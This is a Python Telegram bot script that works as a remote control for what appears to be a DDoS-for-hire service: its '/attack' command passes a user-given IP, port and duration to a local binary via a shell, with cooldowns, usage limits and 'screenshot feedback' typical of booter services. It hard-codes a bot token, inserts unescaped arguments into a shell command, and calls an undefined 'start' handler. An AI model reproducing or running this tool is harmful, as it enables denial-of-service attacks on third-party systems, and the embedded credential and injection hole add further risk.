import os
import asyncio
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

TELEGRAM_BOT_TOKEN = '8016978575:AAGtZq2YIQKIdUuDsx-tb8APm5_SPystyTs'
ALLOWED_USER_ID = 1662672529
bot_access_free = True  

# Define a dictionary to store approved Telegram group and chat IDs
approved_groups = {}

# Define a dictionary to store user's last attack time, total usage, and screenshot feedback status
user_data = {}

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is allowed to use the bot
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    # Check if the user has exceeded the usage limit
    if user_id in user_data:
        last_attack_time = user_data[user_id]['last_attack_time']
        total_usage = user_data[user_id]['total_usage']
        received_screenshot = user_data[user_id]['received_screenshot']

        # Check if the cooldown has passed
        if time.time() - last_attack_time < int(duration):
            remaining_cooldown = int(duration) - (time.time() - last_attack_time)
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Cooldown in progress. Please wait for {remaining_cooldown} seconds.*", parse_mode='Markdown')
            return

        # Check if the usage limit is exceeded
        if total_usage + int(duration) > 180:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ You have exceeded the daily usage limit of 180 seconds.*", parse_mode='Markdown')
            return

        # Check if screenshot feedback has been received
        if not received_screenshot:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please send a screenshot feedback before launching another attack.*", parse_mode='Markdown')
            return

        # Update user data
        user_data[user_id]['last_attack_time'] = time.time()
        user_data[user_id]['total_usage'] += int(duration)
        user_data[user_id]['received_screenshot'] = False  # Reset screenshot status

    else:
        # Initialize user data
        user_data[user_id] = {'last_attack_time': time.time(), 'total_usage': int(duration), 'received_screenshot': False}

    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is allowed to use the bot
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /approve <group_id> or <chat_id>*", parse_mode='Markdown')
        return

    group_id = args[0]

    # Add the group ID to the approved list
    approved_groups[group_id] = True
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ Group/Chat ID {group_id} approved.*", parse_mode='Markdown')

async def remove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is allowed to use the bot
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /remove <group_id> or <chat_id>*", parse_mode='Markdown')
        return

    group_id = args[0]

    # Remove the group ID from the approved list
    if group_id in approved_groups:
        del approved_groups[group_id]
        await context.bot.send_message(chat_id=chat_id, text=f"*🚫 Group/Chat ID {group_id} removed.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Group/Chat ID {group_id} is not in the approved list.*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./1662672529 {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            await context.bot.send_message(chat_id=chat_id, text=f"```\n{stdout.decode()}\n```", parse_mode='Markdown')
        if stderr:
            await context.bot.send_message(chat_id=chat_id, text=f"```\n{stderr.decode()}\n```", parse_mode='Markdown')

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))

    application.run_polling()

if __name__ == '__main__':
    main()
